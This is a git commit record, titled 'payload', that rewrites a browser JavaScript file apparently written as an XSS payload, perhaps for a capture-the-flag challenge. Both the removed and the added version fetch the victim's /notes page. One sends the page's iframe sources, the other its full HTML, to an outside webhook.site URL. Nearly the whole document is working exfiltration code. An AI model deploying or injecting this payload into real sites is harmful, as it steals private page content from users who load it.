08e20803788149ad34459a8d4c82d656b0679b4f
Axl <bryannicholas7@gmail.com>
2025-06-20 22:41:13 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,9 +1,3 @@
-fetch('/notes', {mode: 'no-cors'}).then(r=>r.text()).then(d=>{
-  let doc = (new DOMParser()).parseFromString(d, 'text/html');
-  let iframes = doc.querySelectorAll('iframe');
-  let sources = Array.from(iframes).map(iframe => iframe.getAttribute('src')).join(',');
-  fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+encodeURIComponent(sources), {
-    method: 'GET',
-    mode: 'no-cors'
-  });
-})
+const html_steal = await fetch('/notes', {mode: 'no-cors'})
+const html = await html_steal.text();
+fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html, {method: 'GET', mode: 'no-cors'});
